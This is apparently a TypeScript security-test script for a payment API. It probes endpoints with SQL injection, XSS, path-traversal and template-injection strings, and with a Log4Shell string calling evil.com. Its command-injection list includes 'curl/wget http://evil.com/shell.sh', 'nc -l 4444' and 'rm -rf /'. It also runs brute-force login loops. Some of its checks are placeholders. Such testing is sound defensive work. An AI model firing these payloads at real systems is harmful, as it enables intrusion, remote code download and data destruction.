#!/usr/bin/env ts-node

import axios, { AxiosResponse } from 'axios';
import crypto from 'crypto';
import { Logger } from '../../shared/utils/Logger';
import { EncryptionUtils } from '../../shared/utils/Encryption';

const logger = new Logger('SecurityTesting');

interface SecurityTestConfig {
  baseUrl: string;
  timeout: number;
  maxConcurrentRequests: number;
  testDuration: number; // in seconds
}

interface SecurityTestResult {
  testName: string;
  passed: boolean;
  details: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  recommendation?: string;
}

interface VulnerabilityReport {
  timestamp: string;
  target: string;
  totalTests: number;
  passedTests: number;
  failedTests: number;
  vulnerabilities: SecurityTestResult[];
  riskScore: number;
  overallStatus: 'secure' | 'vulnerable' | 'critical';
}

class SecurityTester {
  private config: SecurityTestConfig;
  private results: SecurityTestResult[] = [];
  private baseHeaders: { [key: string]: string };

  constructor(config: SecurityTestConfig) {
    this.config = config;
    this.baseHeaders = {
      'User-Agent': 'SwiftPayMe-SecurityTester/1.0',
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    };
  }

  // Run all security tests
  public async runAllTests(): Promise<VulnerabilityReport> {
    logger.info('Starting comprehensive security testing', {
      target: this.config.baseUrl,
      timeout: this.config.timeout
    });

    try {
      // Authentication & Authorization Tests
      await this.testAuthentication();
      await this.testAuthorization();
      await this.testSessionManagement();

      // Input Validation Tests
      await this.testInputValidation();
      await this.testSqlInjection();
      await this.testXssProtection();
      await this.testCommandInjection();
      await this.testPathTraversal();

      // Rate Limiting & DoS Protection
      await this.testRateLimiting();
      await this.testBruteForceProtection();
      await this.testRequestSizeValidation();

      // Security Headers Tests
      await this.testSecurityHeaders();
      await this.testCorsConfiguration();
      await this.testCsrfProtection();

      // Encryption & Data Protection Tests
      await this.testDataEncryption();
      await this.testPasswordSecurity();
      await this.testApiKeySecurity();

      // Information Disclosure Tests
      await this.testInformationDisclosure();
      await this.testErrorHandling();
      await this.testDirectoryTraversal();

      // Business Logic Tests
      await this.testBusinessLogicFlaws();
      await this.testPrivilegeEscalation();

      return this.generateReport();

    } catch (error) {
      logger.error('Security testing failed', { error: error.message });
      throw error;
    }
  }

  // Authentication Tests
  private async testAuthentication(): Promise<void> {
    logger.info('Testing authentication mechanisms');

    // Test missing authentication
    await this.testEndpoint(
      'Missing Authentication',
      'GET',
      '/api/users/profile',
      {},
      {},
      (response) => response.status === 401,
      'high',
      'Endpoints should require authentication'
    );

    // Test invalid token
    await this.testEndpoint(
      'Invalid JWT Token',
      'GET',
      '/api/users/profile',
      { 'Authorization': 'Bearer invalid-token' },
      {},
      (response) => response.status === 401,
      'high',
      'Invalid tokens should be rejected'
    );

    // Test expired token
    const expiredToken = this.generateExpiredJWT();
    await this.testEndpoint(
      'Expired JWT Token',
      'GET',
      '/api/users/profile',
      { 'Authorization': `Bearer ${expiredToken}` },
      {},
      (response) => response.status === 401,
      'high',
      'Expired tokens should be rejected'
    );

    // Test malformed token
    await this.testEndpoint(
      'Malformed JWT Token',
      'GET',
      '/api/users/profile',
      { 'Authorization': 'Bearer malformed.token.here' },
      {},
      (response) => response.status === 401,
      'medium',
      'Malformed tokens should be handled gracefully'
    );
  }

  // Authorization Tests
  private async testAuthorization(): Promise<void> {
    logger.info('Testing authorization controls');

    // Test accessing admin endpoints without admin role
    const userToken = this.generateValidUserToken();
    await this.testEndpoint(
      'User Accessing Admin Endpoint',
      'GET',
      '/api/admin/users',
      { 'Authorization': `Bearer ${userToken}` },
      {},
      (response) => response.status === 403,
      'critical',
      'Users should not access admin endpoints'
    );

    // Test privilege escalation
    await this.testEndpoint(
      'Privilege Escalation Attempt',
      'PUT',
      '/api/users/role',
      { 'Authorization': `Bearer ${userToken}` },
      { role: 'admin' },
      (response) => response.status === 403,
      'critical',
      'Users should not be able to escalate privileges'
    );
  }

  // Session Management Tests
  private async testSessionManagement(): Promise<void> {
    logger.info('Testing session management');

    // Test session fixation
    await this.testEndpoint(
      'Session Fixation',
      'POST',
      '/api/auth/login',
      { 'Cookie': 'sessionid=fixed-session-id' },
      { email: 'test@example.com', password: 'password' },
      (response) => {
        const setCookie = response.headers['set-cookie'];
        return !setCookie || !setCookie.some(cookie => cookie.includes('fixed-session-id'));
      },
      'medium',
      'New session should be created on login'
    );

    // Test concurrent sessions
    const token1 = this.generateValidUserToken();
    const token2 = this.generateValidUserToken();
    
    // Both tokens should not be valid simultaneously for the same user
    // This test would require actual token validation logic
  }

  // Input Validation Tests
  private async testInputValidation(): Promise<void> {
    logger.info('Testing input validation');

    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}',
      '<%=7*7%>',
      '#{7*7}',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>'
    ];

    for (const input of maliciousInputs) {
      await this.testEndpoint(
        `Malicious Input: ${input.substring(0, 20)}...`,
        'POST',
        '/api/users/search',
        {},
        { query: input },
        (response) => response.status === 400 || response.status === 422,
        'high',
        'Malicious input should be rejected'
      );
    }
  }

  // SQL Injection Tests
  private async testSqlInjection(): Promise<void> {
    logger.info('Testing SQL injection protection');

    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' OR 1=1 LIMIT 1 --",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "') OR ('1'='1",
      "' OR 1=1#"
    ];

    for (const payload of sqlPayloads) {
      await this.testEndpoint(
        `SQL Injection: ${payload}`,
        'GET',
        `/api/users/${encodeURIComponent(payload)}`,
        {},
        {},
        (response) => response.status === 400 || response.status === 404,
        'critical',
        'SQL injection attempts should be blocked'
      );
    }
  }

  // XSS Protection Tests
  private async testXssProtection(): Promise<void> {
    logger.info('Testing XSS protection');

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<keygen onfocus=alert("XSS") autofocus>'
    ];

    for (const payload of xssPayloads) {
      await this.testEndpoint(
        `XSS Payload: ${payload.substring(0, 30)}...`,
        'POST',
        '/api/notifications/send',
        {},
        { message: payload },
        (response) => response.status === 400 || response.status === 422,
        'high',
        'XSS payloads should be sanitized or rejected'
      );
    }
  }

  // Command Injection Tests
  private async testCommandInjection(): Promise<void> {
    logger.info('Testing command injection protection');

    const commandPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& whoami',
      '`id`',
      '$(id)',
      '; ping -c 1 127.0.0.1',
      '| nc -l 4444',
      '&& curl http://evil.com',
      '; rm -rf /',
      '| wget http://evil.com/shell.sh'
    ];

    for (const payload of commandPayloads) {
      await this.testEndpoint(
        `Command Injection: ${payload}`,
        'POST',
        '/api/assets/verify',
        {},
        { command: payload },
        (response) => response.status === 400 || response.status === 422,
        'critical',
        'Command injection attempts should be blocked'
      );
    }
  }

  // Path Traversal Tests
  private async testPathTraversal(): Promise<void> {
    logger.info('Testing path traversal protection');

    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/var/www/../../etc/passwd',
      'file:///etc/passwd',
      '\\..\\..\\..\\etc\\passwd'
    ];

    for (const payload of pathPayloads) {
      await this.testEndpoint(
        `Path Traversal: ${payload}`,
        'GET',
        `/api/files/${encodeURIComponent(payload)}`,
        {},
        {},
        (response) => response.status === 400 || response.status === 404,
        'high',
        'Path traversal attempts should be blocked'
      );
    }
  }

  // Rate Limiting Tests
  private async testRateLimiting(): Promise<void> {
    logger.info('Testing rate limiting');

    const requests = [];
    const endpoint = '/api/auth/login';
    
    // Send multiple requests rapidly
    for (let i = 0; i < 150; i++) {
      requests.push(
        this.makeRequest('POST', endpoint, {}, {
          email: `test${i}@example.com`,
          password: 'password'
        })
      );
    }

    try {
      const responses = await Promise.allSettled(requests);
      const rateLimited = responses.some(result => 
        result.status === 'fulfilled' && 
        result.value.status === 429
      );

      this.addResult({
        testName: 'Rate Limiting',
        passed: rateLimited,
        details: rateLimited ? 'Rate limiting is active' : 'No rate limiting detected',
        severity: 'high',
        recommendation: rateLimited ? undefined : 'Implement rate limiting to prevent abuse'
      });

    } catch (error) {
      this.addResult({
        testName: 'Rate Limiting',
        passed: false,
        details: `Rate limiting test failed: ${error.message}`,
        severity: 'high'
      });
    }
  }

  // Brute Force Protection Tests
  private async testBruteForceProtection(): Promise<void> {
    logger.info('Testing brute force protection');

    const requests = [];
    const endpoint = '/api/auth/login';
    
    // Attempt multiple failed logins
    for (let i = 0; i < 20; i++) {
      requests.push(
        this.makeRequest('POST', endpoint, {}, {
          email: 'admin@example.com',
          password: `wrongpassword${i}`
        })
      );
    }

    try {
      const responses = await Promise.allSettled(requests);
      const blocked = responses.some(result => 
        result.status === 'fulfilled' && 
        result.value.status === 429
      );

      this.addResult({
        testName: 'Brute Force Protection',
        passed: blocked,
        details: blocked ? 'Brute force protection is active' : 'No brute force protection detected',
        severity: 'critical',
        recommendation: blocked ? undefined : 'Implement brute force protection for login endpoints'
      });

    } catch (error) {
      this.addResult({
        testName: 'Brute Force Protection',
        passed: false,
        details: `Brute force protection test failed: ${error.message}`,
        severity: 'critical'
      });
    }
  }

  // Request Size Validation Tests
  private async testRequestSizeValidation(): Promise<void> {
    logger.info('Testing request size validation');

    // Create large payload
    const largePayload = 'A'.repeat(50 * 1024 * 1024); // 50MB

    await this.testEndpoint(
      'Large Request Body',
      'POST',
      '/api/users/create',
      {},
      { data: largePayload },
      (response) => response.status === 413 || response.status === 400,
      'medium',
      'Large requests should be rejected'
    );
  }

  // Security Headers Tests
  private async testSecurityHeaders(): Promise<void> {
    logger.info('Testing security headers');

    try {
      const response = await this.makeRequest('GET', '/health', {}, {});
      const headers = response.headers;

      const securityHeaders = [
        'x-content-type-options',
        'x-frame-options',
        'x-xss-protection',
        'strict-transport-security',
        'referrer-policy'
      ];

      for (const header of securityHeaders) {
        const present = headers[header] !== undefined;
        this.addResult({
          testName: `Security Header: ${header}`,
          passed: present,
          details: present ? `Header present: ${headers[header]}` : 'Header missing',
          severity: 'medium',
          recommendation: present ? undefined : `Add ${header} security header`
        });
      }

      // Check for information disclosure headers
      const disclosureHeaders = ['server', 'x-powered-by'];
      for (const header of disclosureHeaders) {
        const present = headers[header] !== undefined;
        this.addResult({
          testName: `Information Disclosure: ${header}`,
          passed: !present,
          details: present ? `Header exposes information: ${headers[header]}` : 'Header properly hidden',
          severity: 'low',
          recommendation: present ? `Remove ${header} header to prevent information disclosure` : undefined
        });
      }

    } catch (error) {
      this.addResult({
        testName: 'Security Headers',
        passed: false,
        details: `Security headers test failed: ${error.message}`,
        severity: 'medium'
      });
    }
  }

  // CORS Configuration Tests
  private async testCorsConfiguration(): Promise<void> {
    logger.info('Testing CORS configuration');

    // Test with malicious origin
    await this.testEndpoint(
      'CORS Malicious Origin',
      'OPTIONS',
      '/api/users',
      { 'Origin': 'https://evil.com' },
      {},
      (response) => {
        const allowOrigin = response.headers['access-control-allow-origin'];
        return allowOrigin !== 'https://evil.com' && allowOrigin !== '*';
      },
      'medium',
      'CORS should not allow arbitrary origins'
    );
  }

  // CSRF Protection Tests
  private async testCsrfProtection(): Promise<void> {
    logger.info('Testing CSRF protection');

    const userToken = this.generateValidUserToken();
    
    // Test state-changing operation without CSRF token
    await this.testEndpoint(
      'CSRF Protection',
      'POST',
      '/api/users/update',
      { 'Authorization': `Bearer ${userToken}` },
      { firstName: 'Updated' },
      (response) => response.status === 403,
      'high',
      'State-changing operations should require CSRF protection'
    );
  }

  // Data Encryption Tests
  private async testDataEncryption(): Promise<void> {
    logger.info('Testing data encryption');

    // Test if sensitive data is encrypted in transit
    await this.testEndpoint(
      'HTTPS Enforcement',
      'GET',
      '/api/users/profile',
      {},
      {},
      (response) => {
        // This would need to be tested with actual HTTP vs HTTPS
        return true; // Placeholder
      },
      'critical',
      'All sensitive endpoints should use HTTPS'
    );
  }

  // Password Security Tests
  private async testPasswordSecurity(): Promise<void> {
    logger.info('Testing password security');

    const weakPasswords = [
      'password',
      '123456',
      'admin',
      'qwerty',
      'abc123',
      '12345678'
    ];

    for (const password of weakPasswords) {
      await this.testEndpoint(
        `Weak Password: ${password}`,
        'POST',
        '/api/users/register',
        {},
        {
          email: 'test@example.com',
          password: password,
          firstName: 'Test',
          lastName: 'User'
        },
        (response) => response.status === 400 || response.status === 422,
        'medium',
        'Weak passwords should be rejected'
      );
    }
  }

  // API Key Security Tests
  private async testApiKeySecurity(): Promise<void> {
    logger.info('Testing API key security');

    // Test with invalid API key
    await this.testEndpoint(
      'Invalid API Key',
      'GET',
      '/api/currency/rates',
      { 'X-API-Key': 'invalid-api-key' },
      {},
      (response) => response.status === 401,
      'high',
      'Invalid API keys should be rejected'
    );

    // Test API key in URL (should not be allowed)
    await this.testEndpoint(
      'API Key in URL',
      'GET',
      '/api/currency/rates?api_key=test-key',
      {},
      {},
      (response) => response.status === 401 || response.status === 400,
      'medium',
      'API keys should not be accepted in URL parameters'
    );
  }

  // Information Disclosure Tests
  private async testInformationDisclosure(): Promise<void> {
    logger.info('Testing information disclosure');

    // Test error messages
    await this.testEndpoint(
      'Detailed Error Messages',
      'GET',
      '/api/users/nonexistent',
      {},
      {},
      (response) => {
        const body = response.data;
        return !body || !JSON.stringify(body).includes('stack') && !JSON.stringify(body).includes('trace');
      },
      'medium',
      'Error messages should not expose sensitive information'
    );
  }

  // Error Handling Tests
  private async testErrorHandling(): Promise<void> {
    logger.info('Testing error handling');

    // Test 404 handling
    await this.testEndpoint(
      '404 Error Handling',
      'GET',
      '/api/nonexistent/endpoint',
      {},
      {},
      (response) => response.status === 404,
      'low',
      'Non-existent endpoints should return 404'
    );

    // Test 500 error handling
    await this.testEndpoint(
      '500 Error Handling',
      'POST',
      '/api/test/error',
      {},
      { trigger: 'server_error' },
      (response) => response.status === 500 && response.data && !response.data.stack,
      'medium',
      'Server errors should not expose stack traces'
    );
  }

  // Directory Traversal Tests
  private async testDirectoryTraversal(): Promise<void> {
    logger.info('Testing directory traversal');

    const traversalPaths = [
      '/.env',
      '/package.json',
      '/config/database.js',
      '/../../../etc/passwd',
      '/admin',
      '/debug',
      '/test'
    ];

    for (const path of traversalPaths) {
      await this.testEndpoint(
        `Directory Traversal: ${path}`,
        'GET',
        path,
        {},
        {},
        (response) => response.status === 404 || response.status === 403,
        'medium',
        'Sensitive files and directories should not be accessible'
      );
    }
  }

  // Business Logic Tests
  private async testBusinessLogicFlaws(): Promise<void> {
    logger.info('Testing business logic flaws');

    // Test negative amounts
    await this.testEndpoint(
      'Negative Amount Transaction',
      'POST',
      '/api/payments/transfer',
      {},
      {
        amount: -100,
        currency: 'USD',
        toUserId: 'test-user-id'
      },
      (response) => response.status === 400 || response.status === 422,
      'high',
      'Negative amounts should be rejected'
    );

    // Test zero amounts
    await this.testEndpoint(
      'Zero Amount Transaction',
      'POST',
      '/api/payments/transfer',
      {},
      {
        amount: 0,
        currency: 'USD',
        toUserId: 'test-user-id'
      },
      (response) => response.status === 400 || response.status === 422,
      'medium',
      'Zero amounts should be rejected'
    );
  }

  // Privilege Escalation Tests
  private async testPrivilegeEscalation(): Promise<void> {
    logger.info('Testing privilege escalation');

    const userToken = this.generateValidUserToken();

    // Test accessing other user's data
    await this.testEndpoint(
      'Horizontal Privilege Escalation',
      'GET',
      '/api/users/other-user-id/profile',
      { 'Authorization': `Bearer ${userToken}` },
      {},
      (response) => response.status === 403 || response.status === 404,
      'critical',
      'Users should not access other users\' data'
    );

    // Test modifying other user's data
    await this.testEndpoint(
      'Horizontal Privilege Escalation (Modify)',
      'PUT',
      '/api/users/other-user-id/profile',
      { 'Authorization': `Bearer ${userToken}` },
      { firstName: 'Hacked' },
      (response) => response.status === 403 || response.status === 404,
      'critical',
      'Users should not modify other users\' data'
    );
  }

  // Helper method to test an endpoint
  private async testEndpoint(
    testName: string,
    method: string,
    path: string,
    headers: { [key: string]: string },
    body: any,
    validator: (response: AxiosResponse) => boolean,
    severity: 'low' | 'medium' | 'high' | 'critical',
    recommendation?: string
  ): Promise<void> {
    try {
      const response = await this.makeRequest(method, path, headers, body);
      const passed = validator(response);

      this.addResult({
        testName,
        passed,
        details: `Status: ${response.status}, Response: ${JSON.stringify(response.data).substring(0, 100)}`,
        severity,
        recommendation: passed ? undefined : recommendation
      });

    } catch (error) {
      // Some tests expect errors, so we need to handle them appropriately
      const response = error.response;
      if (response) {
        const passed = validator(response);
        this.addResult({
          testName,
          passed,
          details: `Status: ${response.status}, Error: ${error.message}`,
          severity,
          recommendation: passed ? undefined : recommendation
        });
      } else {
        this.addResult({
          testName,
          passed: false,
          details: `Network error: ${error.message}`,
          severity,
          recommendation
        });
      }
    }
  }

  // Helper method to make HTTP requests
  private async makeRequest(
    method: string,
    path: string,
    headers: { [key: string]: string },
    body: any
  ): Promise<AxiosResponse> {
    const url = `${this.config.baseUrl}${path}`;
    const requestHeaders = { ...this.baseHeaders, ...headers };

    return axios({
      method: method.toLowerCase() as any,
      url,
      headers: requestHeaders,
      data: body,
      timeout: this.config.timeout,
      validateStatus: () => true // Don't throw on any status code
    });
  }

  // Helper method to add test result
  private addResult(result: SecurityTestResult): void {
    this.results.push(result);
    
    const status = result.passed ? 'PASS' : 'FAIL';
    const severity = result.severity.toUpperCase();
    
    logger.info(`[${status}] [${severity}] ${result.testName}: ${result.details}`);
  }

  // Generate test JWT tokens
  private generateValidUserToken(): string {
    // This would generate a valid JWT token for testing
    // In a real implementation, this would use the actual JWT signing logic
    return 'valid-user-token-placeholder';
  }

  private generateExpiredJWT(): string {
    // This would generate an expired JWT token for testing
    return 'expired-token-placeholder';
  }

  // Generate vulnerability report
  private generateReport(): VulnerabilityReport {
    const totalTests = this.results.length;
    const passedTests = this.results.filter(r => r.passed).length;
    const failedTests = totalTests - passedTests;
    const vulnerabilities = this.results.filter(r => !r.passed);

    // Calculate risk score
    const riskScore = this.calculateRiskScore(vulnerabilities);
    
    // Determine overall status
    let overallStatus: 'secure' | 'vulnerable' | 'critical' = 'secure';
    if (vulnerabilities.some(v => v.severity === 'critical')) {
      overallStatus = 'critical';
    } else if (vulnerabilities.length > 0) {
      overallStatus = 'vulnerable';
    }

    const report: VulnerabilityReport = {
      timestamp: new Date().toISOString(),
      target: this.config.baseUrl,
      totalTests,
      passedTests,
      failedTests,
      vulnerabilities,
      riskScore,
      overallStatus
    };

    logger.info('Security testing completed', {
      totalTests,
      passedTests,
      failedTests,
      riskScore,
      overallStatus
    });

    return report;
  }

  // Calculate risk score based on vulnerabilities
  private calculateRiskScore(vulnerabilities: SecurityTestResult[]): number {
    const severityWeights = {
      low: 1,
      medium: 3,
      high: 7,
      critical: 10
    };

    const totalScore = vulnerabilities.reduce((score, vuln) => {
      return score + severityWeights[vuln.severity];
    }, 0);

    // Normalize to 0-100 scale
    const maxPossibleScore = this.results.length * severityWeights.critical;
    return Math.round((totalScore / maxPossibleScore) * 100);
  }
}

// Main execution function
async function runSecurityTests(): Promise<void> {
  const config: SecurityTestConfig = {
    baseUrl: process.env.TEST_BASE_URL || 'http://localhost:3000',
    timeout: parseInt(process.env.TEST_TIMEOUT || '10000'),
    maxConcurrentRequests: parseInt(process.env.MAX_CONCURRENT_REQUESTS || '10'),
    testDuration: parseInt(process.env.TEST_DURATION || '300') // 5 minutes
  };

  const tester = new SecurityTester(config);
  
  try {
    const report = await tester.runAllTests();
    
    // Save report to file
    const fs = require('fs');
    const reportPath = `./security-report-${Date.now()}.json`;
    fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
    
    logger.info(`Security report saved to ${reportPath}`);
    
    // Exit with appropriate code
    process.exit(report.overallStatus === 'secure' ? 0 : 1);
    
  } catch (error) {
    logger.error('Security testing failed', { error: error.message });
    process.exit(1);
  }
}

// Run tests if this script is executed directly
if (require.main === module) {
  runSecurityTests();
}

export { SecurityTester, SecurityTestConfig, SecurityTestResult, VulnerabilityReport };

